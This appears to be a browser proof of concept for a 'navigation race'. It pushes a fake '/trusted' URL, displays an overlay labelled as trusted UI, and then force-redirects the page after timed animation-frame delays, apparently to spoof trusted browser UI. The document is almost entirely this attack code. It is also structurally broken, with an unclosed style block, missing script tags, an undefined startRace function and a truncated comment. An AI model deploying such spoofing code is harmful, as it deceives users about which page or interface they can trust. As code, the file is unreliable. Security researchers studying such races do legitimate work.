<!DOCTYPE html>

<title>Navigation Race PoC</title>
<style>
  #panel {
    display: none;
    position: fixed;
    top: 20%;
    left: 30%;
    padding: 20px;
    background: #fff;
    border: 2px solid #000;
    z-index: 9999;
  }

<button id="trigger">GO</button>

<div id="panel">
  <p>Trusted UI Panel</p>
</div>

const trigger = document.getElementById('trigger');
const panel   = document.getElementById('panel');

/*
 * Step 1:
 * User interaction → change URL + show trusted UI
 */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  // Optional: start delayed redirect timer
  startRace();
};

let raceTimer;

/*
 * Step 2:
 * Navigation race after permission / page show
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {

      // ⏱️ delay diperpanjang (bisa diubah)
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 500); // sebelumnya 80ms

    });
  });
});

 * Optional helper
 * Menunda race supaya lebih realistic
